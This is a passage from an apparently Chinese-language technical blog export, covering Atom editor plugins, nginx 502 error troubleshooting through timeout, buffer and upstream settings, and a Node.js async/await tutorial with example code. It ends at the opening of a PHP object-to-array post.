<h4 id="activate-power-mode-代码震动效果，六的一笔。"><a href="#activate-power-mode-代码震动效果，六的一笔。" class="headerlink" title="activate-power-mode 代码震动效果，六的一笔。"></a>activate-power-mode 代码震动效果，六的一笔。</h4><p><img src="https://cloud.githubusercontent.com/assets/688415/11615565/10f16456-9c65-11e5-8af4-265f01fc83a0.gif" alt="跳动的代码"></p>
<h4 id="atom-autocomplete-php-PHP-代码自动补全。"><a href="#atom-autocomplete-php-PHP-代码自动补全。" class="headerlink" title="atom-autocomplete-php PHP 代码自动补全。"></a>atom-autocomplete-php PHP 代码自动补全。</h4><p><img src="https://camo.githubusercontent.com/773e168c34fe02222ebf158ab699564a96457dd5/687474703a2f2f692e696d6775722e636f6d2f685935797047322e706e67" alt="代码自动补全"></p>
<h4 id="atom-beautify-漂亮的代码，用来格式化代码格式。"><a href="#atom-beautify-漂亮的代码，用来格式化代码格式。" class="headerlink" title="atom-beautify 漂亮的代码，用来格式化代码格式。"></a>atom-beautify 漂亮的代码，用来格式化代码格式。</h4><p><img src="https://cloud.githubusercontent.com/assets/1885333/16542727/db52adc6-408a-11e6-824e-04aed06bd2f7.png" alt="错乱的代码"><br><img src="https://cloud.githubusercontent.com/assets/1885333/16542728/dcac3700-408a-11e6-8e35-9c8fc4432edc.png" alt="整齐的代码"></p>
<h4 id="atom-file-types-文档树中标记文件类型。"><a href="#atom-file-types-文档树中标记文件类型。" class="headerlink" title="atom-file-types 文档树中标记文件类型。"></a>atom-file-types 文档树中标记文件类型。</h4><h4 id="atom-goto-definition-跳转到定义。"><a href="#atom-goto-definition-跳转到定义。" class="headerlink" title="atom-goto-definition 跳转到定义。"></a>atom-goto-definition 跳转到定义。</h4><p><img src="https://camo.githubusercontent.com/eda0a098e9fb8556ef623a9e2375e539dae82708/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f37316566343663316c7931666474387767626169716732307a69306a386864752e676966" alt="跳转到定义"></p>
<h4 id="atom-php-cs-fixer-格式化-PHP-代码。"><a href="#atom-php-cs-fixer-格式化-PHP-代码。" class="headerlink" title="atom-php-cs-fixer 格式化 PHP 代码。"></a>atom-php-cs-fixer 格式化 PHP 代码。</h4><p><img src="https://camo.githubusercontent.com/f887f4e3dcfef8bfd8f5afc4b87358fb8879e935/68747470733a2f2f7261772e6769746875622e636f6d2f706665666665726c652f61746f6d2d7068702d63732d66697865722f6d61737465722f7068702d63732d66697865722e676966" alt="整齐的代码"></p>
<h4 id="atom-quick-highlight-代码高亮。"><a href="#atom-quick-highlight-代码高亮。" class="headerlink" title="atom-quick-highlight 代码高亮。"></a>atom-quick-highlight 代码高亮。</h4><p><img src="https://raw.githubusercontent.com/t9md/t9md/f51b8e211e9ed8ed455053be52d5505da876b298/img/atom-quick-highlight.gif" alt="代码高亮"></p>
<h4 id="busy-signal-忙碌的符号。"><a href="#busy-signal-忙碌的符号。" class="headerlink" title="busy-signal 忙碌的符号。"></a>busy-signal 忙碌的符号。</h4><p><img src="https://cloud.githubusercontent.com/assets/4278113/22865536/0a123074-f188-11e6-8c6e-38574a6fe14c.gif" alt="忙碌的符号"></p>
<h4 id="autocomplete-paths-自动补全地址路径。"><a href="#autocomplete-paths-自动补全地址路径。" class="headerlink" title="autocomplete-paths 自动补全地址路径。"></a>autocomplete-paths 自动补全地址路径。</h4><p><img src="https://camo.githubusercontent.com/7da86dc3d22c9dd1d1c47bcb36237720fd987764/687474703a2f2f73312e64697265637475706c6f61642e6e65742f696d616765732f3134303431312f70356b76696665362e676966" alt="自动补全地址"></p>
<h4 id="emmet-atom-这款插件是用来支持zend-coding，Emmet的前身是大名鼎鼎的Zen-coding，如果你从事Web前端开发的话，对该插件一定不会陌生。它使用仿CSS选择器的语法来生成代码，大大提高了HTML-CSS代码编写的速度。"><a href="#emmet-atom-这款插件是用来支持zend-coding，Emmet的前身是大名鼎鼎的Zen-coding，如果你从事Web前端开发的话，对该插件一定不会陌生。它使用仿CSS选择器的语法来生成代码，大大提高了HTML-CSS代码编写的速度。" class="headerlink" title="emmet-atom 这款插件是用来支持zend-coding，Emmet的前身是大名鼎鼎的Zen coding，如果你从事Web前端开发的话，对该插件一定不会陌生。它使用仿CSS选择器的语法来生成代码，大大提高了HTML&#x2F;CSS代码编写的速度。"></a>emmet-atom 这款插件是用来支持zend-coding，Emmet的前身是大名鼎鼎的Zen coding，如果你从事Web前端开发的话，对该插件一定不会陌生。它使用仿CSS选择器的语法来生成代码，大大提高了HTML&#x2F;CSS代码编写的速度。</h4><h4 id="file-type-icons-文件图标。"><a href="#file-type-icons-文件图标。" class="headerlink" title="file-type-icons 文件图标。"></a>file-type-icons 文件图标。</h4><p><img src="https://raw.githubusercontent.com/lee-dohm/file-type-icons/master/file-type-icons.png" alt="文件图标"></p>
<h4 id="intentions-用于显示Atom中的意图的基本包。"><a href="#intentions-用于显示Atom中的意图的基本包。" class="headerlink" title="intentions 用于显示Atom中的意图的基本包。"></a>intentions 用于显示Atom中的意图的基本包。</h4><p><img src="https://cloud.githubusercontent.com/assets/4278113/12488546/e73809ba-c08d-11e5-8038-dd222f3a815d.png" alt="意图"></p>
<h4 id="linter-语法检查。"><a href="#linter-语法检查。" class="headerlink" title="linter 语法检查。"></a>linter 语法检查。</h4><p><img src="https://cloud.githubusercontent.com/assets/4278113/23879933/1ab17e2a-0872-11e7-803d-3fe0ccfc6790.gif" alt="检查"></p>
<h4 id="linter-php-PHP-语法语句错误检查。"><a href="#linter-php-PHP-语法语句错误检查。" class="headerlink" title="linter-php PHP 语法语句错误检查。"></a>linter-php PHP 语法语句错误检查。</h4><h4 id="minimap-右侧-代码小地图。"><a href="#minimap-右侧-代码小地图。" class="headerlink" title="minimap 右侧 代码小地图。"></a>minimap 右侧 代码小地图。</h4><p><img src="https://github.com/atom-minimap/minimap/raw/master/resources/screenshot.png?raw=true" alt="小地图"></p>
<h4 id="minimap-find-and-replace-查找和替换小地图。"><a href="#minimap-find-and-replace-查找和替换小地图。" class="headerlink" title="minimap-find-and-replace 查找和替换小地图。"></a>minimap-find-and-replace 查找和替换小地图。</h4><p><img src="https://github.com/atom-minimap/minimap-find-and-replace/raw/master/screenshot.png?raw=true" alt="小地图"></p>
<h4 id="php-class-tree-PHP-类的文档树。"><a href="#php-class-tree-PHP-类的文档树。" class="headerlink" title="php-class-tree PHP 类的文档树。"></a>php-class-tree PHP 类的文档树。</h4>]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Atom</tag>
      </tags>
  </entry>
  <entry>
    <title>网站出现 502 BAD GATEWAY 的解决办法</title>
    <url>/2018/11/nginx-502/</url>
    <content><![CDATA[<h2 id="出现-502-bad-gateway-错误的原因"><a href="#出现-502-bad-gateway-错误的原因" class="headerlink" title="出现 502 bad gateway 错误的原因"></a>出现 502 bad gateway 错误的原因</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> php-fpm 进程数不够用</span><br><span class="line"><span class="bullet">2.</span> Linux 内核打开文件数量小</span><br><span class="line"><span class="bullet">3.</span> 脚本执行时间超时</span><br><span class="line"><span class="bullet">4.</span> 缓存设置比较小</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>网站间歇性出现 502，第一反应不是程序的问题，而是 nginx 服务器的问题，因为这是代理服务器出现的问题，代理服务器并没有安装 php 排除第一中情况。</p>
<p>于此想到的是可能是超时，所以我把超时修改了一些</p>
<p>以下是服务器原配置 (重点配置)</p>
<h2 id="http-部分"><a href="#http-部分" class="headerlink" title="http 部分"></a>http 部分</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">server_names_hash_bucket_size</span> <span class="number">64</span>;</span><br><span class="line"><span class="attribute">client_header_buffer_size</span> <span class="number">128</span>k;</span><br><span class="line"><span class="attribute">large_client_header_buffers</span> <span class="number">4</span> <span class="number">32</span>k;</span><br><span class="line"><span class="attribute">client_max_body_size</span> <span class="number">50</span>m;</span><br><span class="line"></span><br><span class="line"><span class="attribute">keepalive_timeout</span> <span class="number">60</span>;</span><br><span class="line"><span class="attribute">fastcgi_connect_timeout</span> <span class="number">60</span>;</span><br><span class="line"><span class="attribute">fastcgi_send_timeout</span> <span class="number">60</span>;</span><br><span class="line"><span class="attribute">fastcgi_read_timeout</span> <span class="number">600</span>;</span><br><span class="line"><span class="attribute">fastcgi_buffer_size</span> <span class="number">64</span>k;</span><br><span class="line"><span class="attribute">fastcgi_buffers</span> <span class="number">4</span> <span class="number">128</span>k;</span><br><span class="line"><span class="attribute">fastcgi_busy_buffers_size</span> <span class="number">128</span>k;</span><br><span class="line"><span class="attribute">fastcgi_temp_file_write_size</span> <span class="number">256</span>k;</span><br><span class="line"></span><br><span class="line"><span class="attribute">gzip_buffers</span> <span class="number">4</span> <span class="number">128</span>k;</span><br></pre></td></tr></table></figure>

<h2 id="server-部分"><a href="#server-部分" class="headerlink" title="server 部分"></a>server 部分</h2><figure class="highlight tp"><table><tr><td class="code"><pre><span class="line">upstream myweb &#123;</span><br><span class="line">server <span class="number">10</span><span class="number">.10</span><span class="number">.10</span><span class="number">.1</span>:<span class="number">80</span> max_fails=<span class="number">3</span> fail_timeout=<span class="number">30</span>s;</span><br><span class="line">server <span class="number">10</span><span class="number">.10</span><span class="number">.10</span><span class="number">.2</span>:<span class="number">80</span> max_fails=<span class="number">3</span> fail_timeout=<span class="number">30</span>s;</span><br><span class="line">ip_hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">proxy_pass http:<span class="comment">//myweb;</span></span><br><span class="line">proxy_next_upstream error timeout invalid_header http_<span class="number">500</span> http_<span class="number">502</span> http_<span class="number">503</span>;</span><br><span class="line">proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">proxy_set_header <span class="keyword">X</span>-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">proxy_set_header <span class="keyword">X</span>-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">proxy_set_header <span class="keyword">X</span>-Forwarded-Proto https;</span><br><span class="line">proxy_redirect off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第一步修改超时-只改了-http-部分-缓冲基本上都加了几倍"><a href="#第一步修改超时-只改了-http-部分-缓冲基本上都加了几倍" class="headerlink" title="第一步修改超时 只改了 http 部分 缓冲基本上都加了几倍"></a>第一步修改超时 只改了 http 部分 缓冲基本上都加了几倍</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">server_names_hash_bucket_size</span> <span class="number">512</span>;</span><br><span class="line"><span class="attribute">client_header_buffer_size</span> <span class="number">512</span>k;</span><br><span class="line"><span class="attribute">large_client_header_buffers</span> <span class="number">16</span> <span class="number">128</span>k;</span><br><span class="line"><span class="attribute">client_max_body_size</span> <span class="number">256</span>m;</span><br><span class="line"></span><br><span class="line"><span class="attribute">keepalive_timeout</span> <span class="number">600</span>;</span><br><span class="line"><span class="attribute">fastcgi_connect_timeout</span> <span class="number">600</span>;</span><br><span class="line"><span class="attribute">fastcgi_send_timeout</span> <span class="number">600</span>;</span><br><span class="line"><span class="attribute">fastcgi_read_timeout</span> <span class="number">600</span>;</span><br><span class="line"><span class="attribute">fastcgi_buffer_size</span> <span class="number">256</span>k;</span><br><span class="line"><span class="attribute">fastcgi_buffers</span> <span class="number">16</span> <span class="number">512</span>k;</span><br><span class="line"><span class="attribute">fastcgi_busy_buffers_size</span> <span class="number">512</span>k;</span><br><span class="line"><span class="attribute">fastcgi_temp_file_write_size</span> <span class="number">1024</span>k;</span><br><span class="line"></span><br><span class="line"><span class="attribute">gzip_buffers</span> <span class="number">16</span> <span class="number">512</span>k;</span><br></pre></td></tr></table></figure>

<p>观察 nginx 出现 502 的频率并没有下降，还是和以前一样</p>
<h2 id="第二步修改-server-代理服务超时"><a href="#第二步修改-server-代理服务超时" class="headerlink" title="第二步修改 server 代理服务超时"></a>第二步修改 server 代理服务超时</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line"><span class="attribute">proxy_pass</span> http://myweb;</span><br><span class="line"><span class="attribute">proxy_next_upstream</span> <span class="literal">error</span> timeout invalid_header http_500 http_502 http_503;</span><br><span class="line"><span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Forwarded-Proto https;</span><br><span class="line"><span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">proxy_connect_timeout</span> <span class="number">300s</span>;</span><br><span class="line"><span class="attribute">proxy_send_timeout</span> <span class="number">300s</span>;</span><br><span class="line"><span class="attribute">proxy_read_timeout</span> <span class="number">300s</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察 nginx502 的频率有一点下降，没有达到预期效果于是更改代理的缓冲区</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line"><span class="attribute">proxy_pass</span> http://myweb;</span><br><span class="line"><span class="attribute">proxy_next_upstream</span> <span class="literal">error</span> timeout invalid_header http_500 http_502 http_503;</span><br><span class="line"><span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Forwarded-Proto http;</span><br><span class="line"><span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line"><span class="attribute">proxy_connect_timeout</span> <span class="number">300s</span>;</span><br><span class="line"><span class="attribute">proxy_send_timeout</span> <span class="number">300s</span>;</span><br><span class="line"><span class="attribute">proxy_read_timeout</span> <span class="number">300s</span>;</span><br><span class="line"><span class="attribute">proxy_buffer_size</span> <span class="number">512k</span>;</span><br><span class="line"><span class="attribute">proxy_buffers</span> <span class="number">32</span> <span class="number">512k</span>;</span><br><span class="line"><span class="attribute">proxy_busy_buffers_size</span> <span class="number">512k</span>;</span><br><span class="line"><span class="attribute">proxy_temp_file_write_size</span> <span class="number">512k</span>;</span><br><span class="line"><span class="attribute">proxy_ignore_client_abort</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察 nginx502 的频率和刚才一样，并没有明显效果。打开 nginx 的错误日志，观察错误状态，nginx 错误日志显示</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[<span class="built_in">error</span>] 20435#0: <span class="number">*3890606</span> <span class="literal">no</span> live upstreams <span class="keyword">while</span> connecting <span class="keyword">to</span> upstream, client:</span><br></pre></td></tr></table></figure>

<p>意思是 nginx 发现没有存活的后端了，后端有两台服务器，这怎么可能</p>
<p>猜想 nginx 在等待后端服务器返回的时候做了判断，如果后端服务器响应慢就有可能踢掉后端服务器，因此就可能把后端的两台服务器都踢掉</p>
<p>所以问题是出在 upstream 配置，原来配置中的 <code>max_fails=3 fail_timeout=30s;</code> 是默认的配置</p>
<p>我尝试修改 <code>max_fails=10 fail_timeout=60s;</code> 观察 nginx 出现 502 的频率下降了很多，但是如果出现 502 就时间比较久。以下是 upstream 最终配置</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">upstream myweb &#123;<span class="built_in"></span></span><br><span class="line"><span class="built_in">server </span>10.10.10.1:80 <span class="attribute">max_fails</span>=60 <span class="attribute">fail_timeout</span>=10s;<span class="built_in"></span></span><br><span class="line"><span class="built_in">server </span>10.10.10.2:80 <span class="attribute">max_fails</span>=60 <span class="attribute">fail_timeout</span>=10s;</span><br><span class="line">ip_hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来可能的优化 调高调高 linux 内核打开文件数量备注一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ‘<span class="built_in">ulimit</span> -HSn 65536′ &gt;&gt; /etc/profile</span><br><span class="line"><span class="built_in">echo</span> ‘<span class="built_in">ulimit</span> -HSn 65536′ &gt;&gt; /etc/rc.local</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
  </entry>
  <entry>
    <title>Nodejs 中使用 Async/Await</title>
    <url>/2018/11/nodejs-async/</url>
    <content><![CDATA[<h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">rejectionWithReturn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>())</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Saved&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">rejectionWithReturn</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">ret</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ret)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="a-在函数体前通过关键字async可以将函数变为async函数"><a href="#a-在函数体前通过关键字async可以将函数变为async函数" class="headerlink" title="&#x2F;&#x2F; a. 在函数体前通过关键字async可以将函数变为async函数"></a>&#x2F;&#x2F; a. 在函数体前通过关键字async可以将函数变为async函数</h4><h4 id="b-在async函数中对需要异步执行的函数前需加await关键字"><a href="#b-在async函数中对需要异步执行的函数前需加await关键字" class="headerlink" title="&#x2F;&#x2F; b. 在async函数中对需要异步执行的函数前需加await关键字"></a>&#x2F;&#x2F; b. 在async函数中对需要异步执行的函数前需加await关键字</h4><h4 id="c-await后的函数必须使用Promise对象封装"><a href="#c-await后的函数必须使用Promise对象封装" class="headerlink" title="&#x2F;&#x2F; c. await后的函数必须使用Promise对象封装"></a>&#x2F;&#x2F; c. await后的函数必须使用Promise对象封装</h4><h4 id="d-async函数执行后返回的是一个Promise对象"><a href="#d-async函数执行后返回的是一个Promise对象" class="headerlink" title="&#x2F;&#x2F; d. async函数执行后返回的是一个Promise对象"></a>&#x2F;&#x2F; d. async函数执行后返回的是一个Promise对象</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> delay_print_first = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;First&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> delay_print_second = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&quot;Second&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> delay_print_third = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&quot;Third&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> async_status = <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">ms</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> first = <span class="keyword">await</span> <span class="title function_">delay_print_first</span>();</span><br><span class="line">        <span class="keyword">var</span> send = <span class="keyword">await</span> <span class="title function_">delay_print_second</span>();</span><br><span class="line">        <span class="keyword">var</span> third = <span class="keyword">await</span> <span class="title function_">delay_print_third</span>();</span><br><span class="line">        <span class="keyword">return</span> first + <span class="string">&quot; &quot;</span> + send + <span class="string">&quot; &quot;</span> + third;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&quot;Some error&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">async_status</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">ret</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ret)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="为了有效的记录下error的信息，通常会在async执行后做一些Promise-catch的处理"><a href="#为了有效的记录下error的信息，通常会在async执行后做一些Promise-catch的处理" class="headerlink" title="&#x2F;&#x2F; 为了有效的记录下error的信息，通常会在async执行后做一些Promise catch的处理"></a>&#x2F;&#x2F; 为了有效的记录下error的信息，通常会在async执行后做一些Promise catch的处理</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Delay</span>_Time = <span class="keyword">function</span>(<span class="params">ms</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve</span>)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(resolve, ms)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Delay</span>_Time_Second = <span class="keyword">function</span>(<span class="params">ms</span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;, ms)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Delay</span>_Print = <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">ms</span>)&#123;</span><br><span class="line">    <span class="title class_">Delay</span>_Time_Second(<span class="number">2000</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After Delay_Time_Second&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">Delay</span>_Time(ms)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After Delay_Time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;END&quot;</span></span><br><span class="line">    <span class="comment">// return Promise.resolve(&quot;END&quot;)</span></span><br><span class="line">    <span class="comment">// return await &quot;END&quot;</span></span><br><span class="line">    <span class="comment">// return new Promise(function(resolve, reject)&#123;</span></span><br><span class="line">    <span class="comment">//     resolve(&quot;END&quot;)</span></span><br><span class="line">    <span class="comment">// &#125;)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Delay</span>_Print(<span class="number">2000</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">resolve</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(resolve)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="在正常的情况下，await后是一个Promise对象。如果不是就会立马转换成一个立即resolve的Promise对象"><a href="#在正常的情况下，await后是一个Promise对象。如果不是就会立马转换成一个立即resolve的Promise对象" class="headerlink" title="&#x2F;&#x2F; 在正常的情况下，await后是一个Promise对象。如果不是就会立马转换成一个立即resolve的Promise对象"></a>&#x2F;&#x2F; 在正常的情况下，await后是一个Promise对象。如果不是就会立马转换成一个立即resolve的Promise对象</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> delay_time = <span class="keyword">function</span>(<span class="params">ms, param</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve</span>)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>())</span><br><span class="line">            <span class="title function_">resolve</span>(param)</span><br><span class="line">        &#125;, ms)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> asyn_fun = <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">param</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> time_out = <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">const</span> results = <span class="keyword">await</span> param.<span class="title function_">map</span>(<span class="keyword">async</span> param =&gt; &#123;</span><br><span class="line">        time_out = time_out + <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">var</span> out = <span class="keyword">await</span> <span class="title function_">delay_time</span>(time_out, param)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">var</span> target = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> ret <span class="keyword">of</span> results)&#123;</span><br><span class="line">        target.<span class="title function_">push</span>(<span class="keyword">await</span> ret)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">asyn_fun</span>([<span class="string">&#x27;First&#x27;</span>, <span class="string">&#x27;Second&#x27;</span>, <span class="string">&#x27;Third&#x27;</span>, <span class="string">&#x27;Last&#x27;</span>]).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">result</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="虽然map方法的参数是async函数，但它是并发执行的，因为只有async函数内部是继发执行，外部不受影响。后面的for-of循环内部使用了await，因此实现了按顺序输出"><a href="#虽然map方法的参数是async函数，但它是并发执行的，因为只有async函数内部是继发执行，外部不受影响。后面的for-of循环内部使用了await，因此实现了按顺序输出" class="headerlink" title="&#x2F;&#x2F; 虽然map方法的参数是async函数，但它是并发执行的，因为只有async函数内部是继发执行，外部不受影响。后面的for..of循环内部使用了await，因此实现了按顺序输出"></a>&#x2F;&#x2F; 虽然map方法的参数是async函数，但它是并发执行的，因为只有async函数内部是继发执行，外部不受影响。后面的for..of循环内部使用了await，因此实现了按顺序输出</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">rejectionWithReturnAwait</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>())</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Saved&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">rejectionWithReturnAwait</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">ret</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ret)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="这段代码在async方法体中通过try-catch捕获被await声明并且状态是rejected的Promise对象，捕获异常后返回立即执行的Promise对象"><a href="#这段代码在async方法体中通过try-catch捕获被await声明并且状态是rejected的Promise对象，捕获异常后返回立即执行的Promise对象" class="headerlink" title="&#x2F;&#x2F; 这段代码在async方法体中通过try&#x2F;catch捕获被await声明并且状态是rejected的Promise对象，捕获异常后返回立即执行的Promise对象"></a>&#x2F;&#x2F; 这段代码在async方法体中通过try&#x2F;catch捕获被await声明并且状态是rejected的Promise对象，捕获异常后返回立即执行的Promise对象</h4><h4 id="上面async代码快内的Promise对象没有使用await关键字声明，因为当Promise对象的状态由pending变成rejected后并不能try-catch捕获"><a href="#上面async代码快内的Promise对象没有使用await关键字声明，因为当Promise对象的状态由pending变成rejected后并不能try-catch捕获" class="headerlink" title="&#x2F;&#x2F; 上面async代码快内的Promise对象没有使用await关键字声明，因为当Promise对象的状态由pending变成rejected后并不能try&#x2F;catch捕获"></a>&#x2F;&#x2F; 上面async代码快内的Promise对象没有使用await关键字声明，因为当Promise对象的状态由pending变成rejected后并不能try&#x2F;catch捕获</h4>]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
  </entry>
  <entry>
    <title>PHP 简单对象与数组的转换</title>
    <url>/2018/11/php-object-array/</url>
    <content><![CDATA[<h2 id="PHP-简单-对象-object-与-数组-array-的转换"><a href="#PHP-简单-对象-object-与-数组-array-的转换" class="headerlink" title="PHP 简单 对象 (object) 与 数组 (array) 的转换"></a>PHP 简单 对象 (object) 与 数组 (array) 的转换</h2><p>Talk is cheap, show me the code. </p>
<span id="more"></span>

